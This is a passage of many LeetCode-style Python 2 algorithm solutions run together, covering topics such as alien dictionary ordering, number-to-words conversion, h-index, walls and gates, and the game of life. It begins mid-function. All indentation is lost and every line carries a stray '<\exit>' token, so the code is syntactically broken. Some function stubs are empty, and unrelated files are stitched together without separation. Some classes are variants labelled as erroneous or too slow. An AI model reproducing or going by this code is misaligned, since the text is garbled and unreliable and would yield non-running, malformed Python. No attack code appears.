self.dfs_path(cur.right, path, ret)<\exit>
path.pop()<\exit>
class Solution:<\exit>
def addDigits(self, num):<\exit>
digit = num % 9<\exit>
if digit == 0 and num != 0:<\exit>
return 9<\exit>
else:<\exit>
return digit<\exit>
class Solution(object):<\exit>
def threeSumSmaller(self, nums, target):<\exit>
nums.sort()<\exit>
cnt = 0<\exit>
n = len(nums)<\exit>
for i in xrange(n-2):<\exit>
l = i+1<\exit>
h = n-1<\exit>
while l < h:<\exit>
if nums[i]+nums[l]+nums[h] < target:<\exit>
cnt += h-l<\exit>
l += 1<\exit>
else:<\exit>
h -= 1<\exit>
return cnt<\exit>
class Solution:<\exit>
def singleNumber(self, nums):<\exit>
bits = 0<\exit>
for elt in nums:<\exit>
bits ^= elt<\exit>
rightmost_bit_set = bits & -bits<\exit>
a = 0<\exit>
b = 0<\exit>
for elt in nums:<\exit>
if elt & rightmost_bit_set:<\exit>
a ^= elt<\exit>
else:<\exit>
b ^= elt<\exit>
return a, b<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def validTree(self, n, edges):<\exit>
if not edges:<\exit>
return n in (0, 1)<\exit>
V = defaultdict(list)<\exit>
for e in edges:<\exit>
V[e[0]].append(e[1])<\exit>
V[e[1]].append(e[0])<\exit>
visited = set()<\exit>
pathset = set()<\exit>
if not self.dfs(V, edges[0][0], None, pathset, visited):<\exit>
return False<\exit>
return len(visited) == n<\exit>
def dfs(self, V, v, pi, pathset, visited):<\exit>
if v in pathset:<\exit>
return False<\exit>
pathset.add(v)<\exit>
for nbr in V[v]:<\exit>
if nbr != pi:<\exit>
if not self.dfs(V, nbr, v, pathset, visited):<\exit>
return False<\exit>
pathset.remove(v)<\exit>
visited.add(v)<\exit>
return True<\exit>
class Solution(object):<\exit>
def isUgly(self, num):<\exit>
if num < 1:<\exit>
return False<\exit>
if num == 1:<\exit>
return True<\exit>
ugly = {2, 3, 5}<\exit>
prime = 2<\exit>
while prime*prime <= num and num > 1:<\exit>
if num % prime != 0:<\exit>
prime += 1<\exit>
else:<\exit>
num /= prime<\exit>
if prime not in ugly:<\exit>
return False<\exit>
if num not in ugly:<\exit>
return False<\exit>
return True<\exit>
import heapq<\exit>
class Node(object):<\exit>
def __init__(self, origin, q):<\exit>
self.origin = origin<\exit>
self.q = q<\exit>
def __cmp__(self, other):<\exit>
return self.q[0] - other.q[0]<\exit>
class Solution(object):<\exit>
def nthUglyNumber(self, n):<\exit>
if n == 1:<\exit>
return 1<\exit>
n -= 1<\exit>
ugly = [2, 3, 5]<\exit>
qs = [Node(i, [i]) for i in ugly]<\exit>
h = list(qs)<\exit>
heapq.heapify(h)<\exit>
cnt = 0<\exit>
ret = 2<\exit>
while cnt < n:<\exit>
cnt += 1<\exit>
popped = heapq.heappop(h)<\exit>
ret = popped.q.pop(0)<\exit>
for i in xrange(ugly.index(popped.origin), 3):<\exit>
qs[i].q.append(ret*ugly[i])<\exit>
heapq.heappush(h, popped)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().nthUglyNumber(10) == 12<\exit>
import sys<\exit>
class Solution(object):<\exit>
def minCostII(self, costs):<\exit>
if not costs:<\exit>
return 0<\exit>
n = len(costs)<\exit>
m = len(costs[0])<\exit>
F = [[0 for _ in xrange(m)] for _ in xrange(n+1)]<\exit>
for i in xrange(1, n+1):<\exit>
for k1 in xrange(m):<\exit>
F[i][k1] = min(<\exit>
F[i-1][k0]+costs[i-1][k1]<\exit>
for k0 in xrange(m)<\exit>
if i == 1 or k1 != k0<\exit>
)<\exit>
return min(F[n][i] for i in xrange(m))<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minCostII([[8]]) == 8<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def canPermutePalindrome(self, s):<\exit>
m = defaultdict(int)<\exit>
for c in s:<\exit>
m[c] += 1<\exit>
once = False<\exit>
for v in m.values():<\exit>
if v % 2 == 1:<\exit>
if once:<\exit>
return False<\exit>
once = True<\exit>
return True<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def generatePalindromes(self, s):<\exit>
m = defaultdict(int)<\exit>
for c in s:<\exit>
m[c] += 1<\exit>
odd = None<\exit>
for k, v in m.items():<\exit>
if v % 2 == 1:<\exit>
if odd is not None:<\exit>
return []<\exit>
odd = k<\exit>
cur = ""<\exit>
if odd:<\exit>
m[odd] -= 1<\exit>
cur = odd<\exit>
ret = []<\exit>
self.grow(s, m, None, cur, ret)<\exit>
return ret<\exit>
def grow(self, s, count_map, pi, cur, ret):<\exit>
if len(cur) == len(s):<\exit>
ret.append(cur)<\exit>
return<\exit>
for k in count_map.keys():<\exit>
if k != pi and count_map[k] > 0:<\exit>
for i in xrange(1, count_map[k]/2+1):<\exit>
count_map[k] -= i*2<\exit>
self.grow(s, count_map, k, k*i+cur+k*i, ret)<\exit>
count_map[k] += i*2<\exit>
if __name__ == "__main__":<\exit>
assert Solution().generatePalindromes("aabb") == ['baab', 'abba']<\exit>
class Solution(object):<\exit>
def missingNumber(self, nums):<\exit>
num_n = None<\exit>
n = len(nums)<\exit>
i = 0<\exit>
while i < n:<\exit>
if nums[i] == n:<\exit>
num_n = nums[i]<\exit>
nums[i] = None<\exit>
i += 1<\exit>
elif nums[i] is not None and nums[i] != i:<\exit>
j = nums[i]<\exit>
nums[i], nums[j] = nums[j], nums[i]<\exit>
else:<\exit>
i += 1<\exit>
if not num_n:<\exit>
return n<\exit>
return nums.index(None)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().missingNumber([2, 0]) == 1<\exit>
from typing import List<\exit>
from collections import defaultdict, deque<\exit>
class Solution(object):<\exit>
def alienOrder(self, words: List[str]) -> str:<\exit>
G = self.construct_graph(words)<\exit>
visited = defaultdict(int)<\exit>
ret = deque()<\exit>
for u in G.keys():<\exit>
if visited[u] == 0:<\exit>
if not self.topo_dfs(G, u, visited, ret):<\exit>
return ""<\exit>
return "".join(ret)<\exit>
def construct_graph(self, words):<\exit>
G = defaultdict(list)<\exit>
for w in words:<\exit>
for c in w:<\exit>
G[c]<\exit>
for i in range(len(words) - 1):<\exit>
for c1, c2 in zip(words[i], words[i+1]):<\exit>
if c1 != c2:<\exit>
G[c1].append(c2)<\exit>
break<\exit>
return G<\exit>
def topo_dfs(self, G, u, visited, ret):<\exit>
visited[u] = 1<\exit>
for nbr in G[u]:<\exit>
if visited[nbr] == 1:<\exit>
return False<\exit>
if visited[nbr] == 0:<\exit>
if not self.topo_dfs(G, nbr, visited, ret):<\exit>
return False<\exit>
visited[u] = 2<\exit>
ret.appendleft(u)<\exit>
return True<\exit>
if __name__ == "__main__":<\exit>
lst = ["ze", "yf", "xd", "wd", "vd", "ua", "tt", "sz", "rd", "qd", "pz", "op", "nw", "mt", "ln", "ko", "jm", "il",<\exit>
"ho", "gk", "fa", "ed", "dg", "ct", "bb", "ba"]<\exit>
assert Solution().alienOrder(lst) == "zyxwvutsrqponmlkjihgfedcba"<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def alienOrder(self, words):<\exit>
V = self.construct_graph(words)<\exit>
visited = set()<\exit>
pathset = set()<\exit>
ret = []<\exit>
for v in V.keys():<\exit>
if v not in visited:<\exit>
if not self.topo_dfs(V, v, visited, pathset, ret):<\exit>
return ""<\exit>
return "".join(reversed(ret))<\exit>
def construct_graph(self, words):<\exit>
V = defaultdict(list)<\exit>
for w in words:<\exit>
for c in w:<\exit>
V[c]<\exit>
for i in xrange(len(words) - 1):<\exit>
for j in xrange(min(len(words[i]), len(words[i+1]))):<\exit>
if words[i][j] != words[i+1][j]:<\exit>
V[words[i][j]].append(words[i+1][j])<\exit>
break<\exit>
return V<\exit>
def topo_dfs(self, V, v, visited, pathset, ret):<\exit>
if v in pathset:<\exit>
return False<\exit>
pathset.add(v)<\exit>
for nbr in V[v]:<\exit>
if nbr not in visited:<\exit>
if not self.topo_dfs(V, nbr, visited, pathset, ret):<\exit>
return False<\exit>
pathset.remove(v)<\exit>
visited.add(v)<\exit>
ret.append(v)<\exit>
return True<\exit>
def construct_graph_tedious(self, words, up, down, ptr, V):<\exit>
i = up<\exit>
while i < down:<\exit>
if ptr >= len(words[i]):<\exit>
i += 1<\exit>
else:<\exit>
if words[i][ptr] not in V:<\exit>
V[words[i][ptr]] = []<\exit>
j = i+1<\exit>
while j < down and ptr < len(words[j]) and words[j][ptr] == words[i][ptr]:<\exit>
j += 1<\exit>
self.construct_graph_tedious(words, i, j, ptr+1, V)<\exit>
if j < down and ptr < len(words[j]):<\exit>
V[words[i][ptr]].append(words[j][ptr])<\exit>
i = j<\exit>
if __name__ == "__main__":<\exit>
lst = ["ze", "yf", "xd", "wd", "vd", "ua", "tt", "sz", "rd", "qd", "pz", "op", "nw", "mt", "ln", "ko", "jm", "il",<\exit>
"ho", "gk", "fa", "ed", "dg", "ct", "bb", "ba"]<\exit>
assert Solution().alienOrder(lst) == "zyxwvutsrqponmlkjihgfedcba"<\exit>
import sys<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution(object):<\exit>
def closestValue(self, root, target):<\exit>
lo = [-sys.float_info.max]<\exit>
self.find(root, target, lo, True)<\exit>
hi = [sys.float_info.max]<\exit>
self.find(root, target, hi, False)<\exit>
if hi[0] - target < target - lo[0]:<\exit>
return int(hi[0])<\exit>
else:<\exit>
return int(lo[0])<\exit>
def find(self, root, target, ret, lower=True):<\exit>
if not root:<\exit>
return<\exit>
if root.val == target:<\exit>
ret[0] = root.val<\exit>
return<\exit>
if root.val < target:<\exit>
if lower: ret[0] = max(ret[0], root.val)<\exit>
self.find(root.right, target, ret, lower)<\exit>
else:<\exit>
if not lower: ret[0] = min(ret[0], root.val)<\exit>
self.find(root.left, target, ret, lower)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().closestValue(TreeNode(2147483647), 0.0) == 2147483647<\exit>
class Codec(object):<\exit>
def encode(self, strs):<\exit>
strs = map(lambda x: str(len(x))+"/"+x, strs)<\exit>
return reduce(lambda x, y: x+y, strs, "")<\exit>
def decode(self, s):<\exit>
strs = []<\exit>
i = 0<\exit>
while i < len(s):<\exit>
j = s.index("/", i)<\exit>
l = int(s[i:j])<\exit>
strs.append(s[j+1:j+1+l])<\exit>
i = j+1+l<\exit>
return strs<\exit>
class CodecMethod2(object):<\exit>
def encode(self, strs):<\exit>
strs = map(lambda x: x.replace("\n", "\n\n")+"_\n_", strs)<\exit>
return reduce(lambda x, y: x+y, strs, "")<\exit>
def decode(self, s):<\exit>
strs = s.split("_\n_")<\exit>
strs = strs[:-1]<\exit>
return map(lambda x: x.replace("\n\n", "\n"), strs)<\exit>
class CodecError(object):<\exit>
def encode(self, strs):<\exit>
strs = map(lambda x: x.replace("\x00", "\\x00"), strs)<\exit>
ret = ""<\exit>
for s in strs:<\exit>
ret += s+"\x00"<\exit>
return ret<\exit>
def decode(self, s):<\exit>
if "\x00" not in s:<\exit>
return []<\exit>
s = s[:-1]<\exit>
strs = s.split("\x00")<\exit>
strs = map(lambda x: x.replace("\\x00", "\x00"), strs)<\exit>
return strs<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution(object):<\exit>
def closestKValues(self, root, target, k):<\exit>
pre = []<\exit>
suc = []<\exit>
self.predecessors(root, target, pre)<\exit>
self.successors(root, target, suc)<\exit>
return self.merge(target, k, pre, suc)<\exit>
def predecessors(self, root, target, stk):<\exit>
if not root:<\exit>
return<\exit>
self.predecessors(root.left, target, stk)<\exit>
if root.val <= target:<\exit>
stk.append(root.val)<\exit>
self.predecessors(root.right, target, stk)<\exit>
def successors(self, root, target, stk):<\exit>
if not root:<\exit>
return<\exit>
self.successors(root.right, target, stk)<\exit>
if root.val > target:<\exit>
stk.append(root.val)<\exit>
self.successors(root.left, target, stk)<\exit>
def merge(self, target, k, pre, suc):<\exit>
ret = []<\exit>
while len(ret) < k:<\exit>
if not pre:<\exit>
ret.append(suc.pop())<\exit>
elif not suc:<\exit>
ret.append(pre.pop())<\exit>
elif abs(pre[-1] - target) < abs(suc[-1] - target):<\exit>
ret.append(pre.pop())<\exit>
else:<\exit>
ret.append(suc.pop())<\exit>
return ret<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.table = {<\exit>
0: None,<\exit>
1: "One",<\exit>
2: "Two",<\exit>
3: "Three",<\exit>
4: "Four",<\exit>
5: "Five",<\exit>
6: "Six",<\exit>
7: "Seven",<\exit>
8: "Eight",<\exit>
9: "Nine",<\exit>
10: "Ten",<\exit>
11: "Eleven",<\exit>
12: "Twelve",<\exit>
13: "Thirteen",<\exit>
14: "Fourteen",<\exit>
15: "Fifteen",<\exit>
16: "Sixteen",<\exit>
17: "Seventeen",<\exit>
18: "Eighteen",<\exit>
19: "Nineteen",<\exit>
20: "Twenty",<\exit>
30: "Thirty",<\exit>
40: "Forty",<\exit>
50: "Fifty",<\exit>
60: "Sixty",<\exit>
70: "Seventy",<\exit>
80: "Eighty",<\exit>
90: "Ninety",<\exit>
100: "Hundred",<\exit>
1000: "Thousand",<\exit>
1000000: "Million",<\exit>
1000000000: "Billion"<\exit>
}<\exit>
def numberToWords(self, num):<\exit>
if num == 0: return "Zero"<\exit>
ret = []<\exit>
self.toWords(num, ret)<\exit>
ret = filter(lambda x: x, ret)<\exit>
return " ".join(map(str, ret))<\exit>
def toWords(self, num, ret):<\exit>
SIGS = [1000000000, 1000000, 1000, 100]<\exit>
for SIG in SIGS:<\exit>
self.partial_parse(num, SIG, ret)<\exit>
num %= SIG<\exit>
TEN = 10<\exit>
if num/TEN > 1:<\exit>
ret.append(self.table[(num/TEN)*TEN])<\exit>
ret.append(self.table[num%TEN])<\exit>
def partial_parse(self, num, sig, ret):<\exit>
if num/sig:<\exit>
prefix = []<\exit>
self.toWords(num/sig, prefix)<\exit>
ret.extend(prefix)<\exit>
ret.append(self.table[sig])<\exit>
if __name__ == "__main__":<\exit>
assert Solution().numberToWords(1234567891) == "One Billion Two Hundred Thirty Four Million Five Hundred Sixty " \<\exit>
"Seven Thousand Eight Hundred Ninety One"<\exit>
class Solution(object):<\exit>
def hIndex(self, A):<\exit>
n = len(A)<\exit>
cnt = [0 for _ in xrange(n+1)]<\exit>
for e in A:<\exit>
if e >= n:<\exit>
cnt[n] += 1<\exit>
else:<\exit>
cnt[e] += 1<\exit>
F = [0 for _ in xrange(n+2)]<\exit>
for i in xrange(n, -1, -1):<\exit>
F[i] += F[i+1] + cnt[i]<\exit>
if F[i] >= i:<\exit>
return i<\exit>
return 0<\exit>
def hIndex_sort(self, citations):<\exit>
n = len(citations)<\exit>
citations.sort()<\exit>
for i in xrange(n):<\exit>
if citations[i] >= n-i:<\exit>
return n-i<\exit>
return 0<\exit>
def hIndex_reverse_sort(self, citations):<\exit>
citations.sort(reverse=True)<\exit>
citations.append(0)<\exit>
h = 0<\exit>
for i in xrange(len(citations)-1):<\exit>
if citations[i] >= i+1 >= citations[i+1]:<\exit>
h = i+1<\exit>
elif h:<\exit>
break<\exit>
return h<\exit>
if __name__ == "__main__":<\exit>
assert Solution().hIndex([3, 0, 6, 1, 5]) == 3<\exit>
class Solution(object):<\exit>
def hIndex(self, A):<\exit>
n = len(A)<\exit>
s = 0<\exit>
e = n<\exit>
while s < e:<\exit>
m = (s+e)/2<\exit>
if A[m] >= n-m:<\exit>
e = m<\exit>
else:<\exit>
s = m+1<\exit>
return n-s<\exit>
if __name__ == "__main__":<\exit>
assert Solution().hIndex([0, 1, 3, 5, 6]) == 3<\exit>
class Solution(object):<\exit>
def numWays_oneliner(self, n, k):<\exit>
return 0 if n < 1 else sum(reduce(lambda F, i: [(k-1)*(F[0]+F[1]), F[0]], xrange(1, n), [k, 0]))<\exit>
def numWays(self, n, k):<\exit>
if n < 1:<\exit>
return 0<\exit>
num_diff = k<\exit>
num_same = 0<\exit>
for _ in xrange(1, n):<\exit>
num_diff, num_same = (k-1)*(num_diff+num_same), num_diff<\exit>
return num_diff+num_same<\exit>
def numWays_MLE2(self, n, k):<\exit>
if n < 1:<\exit>
return 0<\exit>
F = [[[0 for _ in xrange(k)] for _ in xrange(k)] for _ in xrange(2)]<\exit>
EMPTY = 0<\exit>
for j0 in xrange(k):<\exit>
F[1][j0][EMPTY] = 1<\exit>
for i in xrange(2, n+1):<\exit>
for j0 in xrange(k):<\exit>
for j1 in xrange(k):<\exit>
F[i%2][j0][j1] = 0<\exit>
for j0 in xrange(k):<\exit>
for j1 in xrange(k):<\exit>
for j2 in xrange(k):<\exit>
if i == 2:<\exit>
F[i%2][j0][j1] = F[(i-1)%2][j1][EMPTY]<\exit>
elif j1 == j2 and j0 != j1:<\exit>
F[i%2][j0][j1] += F[(i-1)%2][j1][j2]<\exit>
elif j1 != j2:<\exit>
F[i%2][j0][j1] += F[(i-1)%2][j1][j2]<\exit>
ret = 0<\exit>
for j0 in xrange(k):<\exit>
for j1 in xrange(k):<\exit>
ret += F[n%2][j0][j1]<\exit>
return ret<\exit>
def numWays_MLE(self, n, k):<\exit>
if n < 1:<\exit>
return 0<\exit>
F = [[[0 for _ in xrange(k)] for _ in xrange(k)] for _ in xrange(n+1)]<\exit>
EMPTY = 0<\exit>
for j0 in xrange(k):<\exit>
F[1][j0][EMPTY] = 1<\exit>
for i in xrange(2, n+1):<\exit>
for j0 in xrange(k):<\exit>
for j1 in xrange(k):<\exit>
for j2 in xrange(k):<\exit>
if i == 2:<\exit>
F[i][j0][j1] = F[i-1][j1][EMPTY]<\exit>
elif j1 == j2 and j0 != j1:<\exit>
F[i][j0][j1] += F[i-1][j1][j2]<\exit>
elif j1 != j2:<\exit>
F[i][j0][j1] += F[i-1][j1][j2]<\exit>
ret = 0<\exit>
for j0 in xrange(k):<\exit>
for j1 in xrange(k):<\exit>
ret += F[n][j0][j1]<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().numWays(3, 2) == 6<\exit>
def knows(a, b):<\exit>
class Solution(object):<\exit>
def findCelebrity(self, n):<\exit>
i = 0<\exit>
j = n-1<\exit>
while i < j:<\exit>
nxt_i, nxt_j = i, j<\exit>
if knows(i, j) or not knows(j, i):<\exit>
nxt_i += 1<\exit>
if knows(j, i) or not knows(i, j):<\exit>
nxt_j -= 1<\exit>
i, j = nxt_i, nxt_j<\exit>
celebrity = i<\exit>
for i in xrange(n):<\exit>
if i != celebrity and (not knows(i, celebrity) or knows(celebrity, i)):<\exit>
return -1<\exit>
return celebrity<\exit>
def findCelebrity_set(self, n):<\exit>
V = set(range(n))<\exit>
while len(V) > 1:<\exit>
a = V.pop()<\exit>
b = V.pop()<\exit>
if knows(a, b) and not knows(b, a):<\exit>
V.add(b)<\exit>
elif not knows(a, b) and knows(b, a):<\exit>
V.add(a)<\exit>
if not V:<\exit>
return -1<\exit>
celebrity = V.pop()<\exit>
for i in xrange(n):<\exit>
if i != celebrity and (not knows(i, celebrity) or knows(celebrity, i)):<\exit>
return -1<\exit>
return celebrity<\exit>
def isBadVersion(version):<\exit>
pass<\exit>
class Solution(object):<\exit>
def firstBadVersion(self, n):<\exit>
l = 1<\exit>
h = n+1<\exit>
while l < h:<\exit>
m = (l+h)/2<\exit>
if not isBadVersion(m):<\exit>
l = m+1<\exit>
else:<\exit>
h = m<\exit>
return l<\exit>
import math<\exit>
import sys<\exit>
class Solution(object):<\exit>
F = [0]<\exit>
def numSquares(self, n):<\exit>
while len(Solution.F) <= n:<\exit>
i = len(Solution.F)<\exit>
Solution.F.append(sys.maxint)<\exit>
j = 1<\exit>
while i - j*j >= 0:<\exit>
Solution.F[i] = min(Solution.F[i], Solution.F[i-j*j]+1)<\exit>
j += 1<\exit>
return Solution.F[n]<\exit>
def numSquares_bfs(self, n):<\exit>
q = [0]<\exit>
visited = [False for _ in xrange(n+1)]<\exit>
level = 0<\exit>
while q:<\exit>
level += 1<\exit>
l = len(q)<\exit>
for i in xrange(l):<\exit>
for j in xrange(1, int(math.sqrt(n))+1):<\exit>
nxt = q[i]+j*j<\exit>
if nxt <= n and visited[nxt]:<\exit>
continue<\exit>
elif nxt < n:<\exit>
visited[nxt] = True<\exit>
q.append(nxt)<\exit>
elif nxt == n:<\exit>
return level<\exit>
else:<\exit>
break<\exit>
q = q[l:]<\exit>
return None<\exit>
def numSquares_TLE(self, n):<\exit>
F = [i for i in xrange(n+1)]<\exit>
for i in xrange(1, n+1):<\exit>
for j in xrange(1, int(math.sqrt(i))+1):<\exit>
if i-j*j >= 0:<\exit>
F[i] = min(F[i], F[i-j*j]+1)<\exit>
return F[n]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().numSquares(6) == 3<\exit>
class Solution(object):<\exit>
def wiggleSort(self, nums):<\exit>
i = 0<\exit>
for elt in sorted(nums):<\exit>
if i >= len(nums):<\exit>
i = 1<\exit>
nums[i] = elt<\exit>
i += 2<\exit>
class ZigzagIterator(object):<\exit>
def __init__(self, v1, v2):<\exit>
self.mat = [v1, v2]<\exit>
self.maxa = max((c, r) for r, c in enumerate(map(lambda x: len(x)-1, self.mat)))<\exit>
self.i = 0<\exit>
self.j = 0<\exit>
self._reposition()<\exit>
def _reposition(self):<\exit>
while self.i >= len(self.mat) or self.j >= len(self.mat[self.i]):<\exit>
if not self.hasNext():<\exit>
return<\exit>
elif self.i >= len(self.mat):<\exit>
self.i = 0<\exit>
self.j += 1<\exit>
elif self.j >= len(self.mat[self.i]):<\exit>
self.i += 1<\exit>
def next(self):<\exit>
if not self.hasNext():<\exit>
raise StopIteration<\exit>
ret = self.mat[self.i][self.j]<\exit>
self.i += 1<\exit>
self._reposition()<\exit>
return ret<\exit>
def hasNext(self):<\exit>
return self.j <= self.maxa[0]<\exit>
if __name__ == "__main__":<\exit>
v1 = [1, 2]<\exit>
v2 = [3, 4, 5, 6]<\exit>
itr = ZigzagIterator(v1, v2)<\exit>
while itr.hasNext():<\exit>
print itr.next()<\exit>
class Solution(object):<\exit>
def addOperators(self, num, target):<\exit>
ret = []<\exit>
self.dfs(num, target, 0, "", 0, 0, ret)<\exit>
return ret<\exit>
def dfs(self, num, target, pos, cur_str, cur_val, mul, ret):<\exit>
if pos >= len(num):<\exit>
if cur_val == target:<\exit>
ret.append(cur_str)<\exit>
else:<\exit>
for i in xrange(pos, len(num)):<\exit>
if i != pos and num[pos] == "0":<\exit>
continue<\exit>
nxt_val = int(num[pos:i+1])<\exit>
if not cur_str:<\exit>
self.dfs(num, target, i+1, "%d"%nxt_val, nxt_val, nxt_val, ret)<\exit>
else:<\exit>
self.dfs(num, target, i+1, cur_str+"+%d"%nxt_val, cur_val+nxt_val, nxt_val, ret)<\exit>
self.dfs(num, target, i+1, cur_str+"-%d"%nxt_val, cur_val-nxt_val, -nxt_val, ret)<\exit>
self.dfs(num, target, i+1, cur_str+"*%d"%nxt_val, cur_val-mul+mul*nxt_val, mul*nxt_val, ret)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().addOperators("232", 8) == ["2+3*2", "2*3+2"]<\exit>
class Solution(object):<\exit>
def moveZeroes(self, nums):<\exit>
left = -1<\exit>
for i in xrange(len(nums)):<\exit>
if nums[i] != 0:<\exit>
left += 1<\exit>
nums[left], nums[i] = nums[i], nums[left]<\exit>
class SolutionCount(object):<\exit>
def moveZeroes(self, nums):<\exit>
cnt = 0<\exit>
for elt in nums:<\exit>
if elt != 0:<\exit>
nums[cnt] = elt<\exit>
cnt += 1<\exit>
for j in xrange(cnt, len(nums)):<\exit>
nums[j] = 0<\exit>
if __name__ == "__main__":<\exit>
lst = [0, 1, 0, 3, 12]<\exit>
Solution().moveZeroes(lst)<\exit>
assert lst == [1, 3, 12, 0, 0]<\exit>
class Iterator(object):<\exit>
def __init__(self, nums):<\exit>
def hasNext(self):<\exit>
def next(self):<\exit>
class PeekingIterator(object):<\exit>
def __init__(self, iterator):<\exit>
self.nxt = None<\exit>
self.iterator = iterator<\exit>
def peek(self):<\exit>
if not self.nxt:<\exit>
self.nxt = self.iterator.next()<\exit>
return self.nxt<\exit>
def next(self):<\exit>
ret = self.peek()<\exit>
self.nxt = None<\exit>
return ret<\exit>
def hasNext(self):<\exit>
return self.nxt is not None or self.iterator.hasNext()<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution(object):<\exit>
def inorderSuccessor(self, root, p):<\exit>
find = [None]<\exit>
self.search(root, p, find)<\exit>
return find[0]<\exit>
def search(self, cur, p, find):<\exit>
if not cur:<\exit>
return<\exit>
if cur.val > p.val:<\exit>
find[0] = cur<\exit>
self.search(cur.left, p, find)<\exit>
else:<\exit>
self.search(cur.right, p, find)<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.dirs = ((-1, 0), (1, 0), (0, -1), (0, 1))<\exit>
def wallsAndGates(self, mat):<\exit>
q = [(i, j) for i, row in enumerate(mat) for j, val in enumerate(row) if val == 0]<\exit>
for i, j in q:<\exit>
for d in self.dirs:<\exit>
i1, j1 = i+d[0], j+d[1]<\exit>
if 0 <= i1 < len(mat) and 0 <= j1 < len(mat[0]) and mat[i1][j1] > mat[i][j]+1:<\exit>
mat[i1][j1] = mat[i][j]+1<\exit>
q.append((i1, j1))<\exit>
class Solution_slow(object):<\exit>
def __init__(self):<\exit>
self.dirs = ((-1, 0), (1, 0), (0, -1), (0, 1))<\exit>
def wallsAndGates(self, rooms):<\exit>
if not rooms: return<\exit>
m = len(rooms)<\exit>
if not m: return<\exit>
n = len(rooms[0])<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if rooms[i][j] == 0:<\exit>
self.bfs_deque(rooms, i, j)<\exit>
def bfs(self, rooms, x, y):<\exit>
m = len(rooms)<\exit>
n = len(rooms[0])<\exit>
level = 0<\exit>
q = [(x, y)]<\exit>
while q:<\exit>
l = len(q)<\exit>
for idx in xrange(l):<\exit>
i, j = q[idx]<\exit>
rooms[i][j] = min(rooms[i][j], level)<\exit>
for d in self.dirs:<\exit>
i_t = i+d[0]<\exit>
j_t = j+d[1]<\exit>
if 0 <= i_t < m and 0 <= j_t < n and rooms[i_t][j_t] != -1 and rooms[i_t][j_t] >= level+1:<\exit>
q.append((i_t, j_t))<\exit>
q = q[l:]<\exit>
level += 1<\exit>
def bfs_deque(self, rooms, x, y):<\exit>
from collections import deque<\exit>
m = len(rooms)<\exit>
n = len(rooms[0])<\exit>
q = deque()<\exit>
q.append((x, y, 0))<\exit>
while q:<\exit>
i, j, level = q.popleft()<\exit>
rooms[i][j] = min(rooms[i][j], level)<\exit>
for d in self.dirs:<\exit>
i_t, j_t = i+d[0], j+d[1]<\exit>
if 0 <= i_t < m and 0 <= j_t < n and rooms[i_t][j_t] != -1 and rooms[i_t][j_t] >= level+1:<\exit>
q.append((i_t, j_t, level+1))<\exit>
class Solution_error(object):<\exit>
def __init__(self):<\exit>
self.dirs = ((-1, 0), (1, 0), (0, -1), (0, 1))<\exit>
def wallsAndGates(self, rooms):<\exit>
if not rooms: return<\exit>
m = len(rooms)<\exit>
if not m: return<\exit>
n = len(rooms[0])<\exit>
visited = [[False for _ in xrange(n)] for _ in xrange(m)]<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if not visited[i][j]:<\exit>
self.dfs(rooms, i, j, visited)<\exit>
def dfs(self, rooms, i, j, visited):<\exit>
if not visited[i][j]:<\exit>
visited[i][j] = True<\exit>
for d in self.dirs:<\exit>
nxt_i = i+d[0]<\exit>
nxt_j = j+d[1]<\exit>
if rooms[nxt_i][nxt_j] != -1:<\exit>
rooms[nxt_i][nxt_j] = min(rooms[nxt_i][nxt_j], self.dfs(rooms, nxt_i, nxt_j, visited)+1)<\exit>
return rooms[nxt_i][nxt_j]<\exit>
class Solution(object):<\exit>
def findDuplicate(self, nums):<\exit>
f, s = 0, 0<\exit>
while True:<\exit>
f = nums[nums[f]]<\exit>
s = nums[s]<\exit>
if f == s:<\exit>
break<\exit>
t = 0<\exit>
while t != s:<\exit>
t = nums[t]<\exit>
s = nums[s]<\exit>
return t<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findDuplicate([1, 2, 3 ,4, 5, 5]) == 5<\exit>
from collections import defaultdict<\exit>
class ValidWordAbbr(object):<\exit>
def __init__(self, dictionary):<\exit>
self.abbrev = defaultdict(int)<\exit>
self.dictionary = set(dictionary)<\exit>
for word in dictionary:<\exit>
self.abbrev[self.process(word)] += 1<\exit>
def process(self, word):<\exit>
if len(word) <= 2:<\exit>
return word<\exit>
return word[0]+str(len(word)-2)+word[-1]<\exit>
def isUnique(self, word):<\exit>
return (word in self.dictionary and self.abbrev[self.process(word)] == 1 or<\exit>
not self.process(word) in self.abbrev)<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.dirs = [(-1, 0), (-1, -1), (0, -1), (1, -1), (1, 0), (1, 1), (0, 1), (-1, 1)]<\exit>
def gameOfLife(self, board):<\exit>
m = len(board)<\exit>
n = len(board[0])<\exit>
lines = [[0 for _ in xrange(n)] for _ in xrange(2)]<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
lines[(i+1)%2][j] = board[i][j]<\exit>
cnt = 0<\exit>
for d in self.dirs:<\exit>
I = i+d[0]<\exit>
J = j+d[1]<\exit>
if 0 <= I < m and 0 <= J < n:<\exit>
if I < i:<\exit>
cnt += lines[i%2][J]<\exit>
elif I == i and J < j:<\exit>
cnt += lines[(i+1)%2][J]<\exit>
else:<\exit>
cnt += board[I][J]<\exit>
if cnt == 3:<\exit>
board[i][j] = 1<\exit>
elif cnt == 2:<\exit>
board[i][j] &= 1<\exit>
else:<\exit>
board[i][j] = 0<\exit>
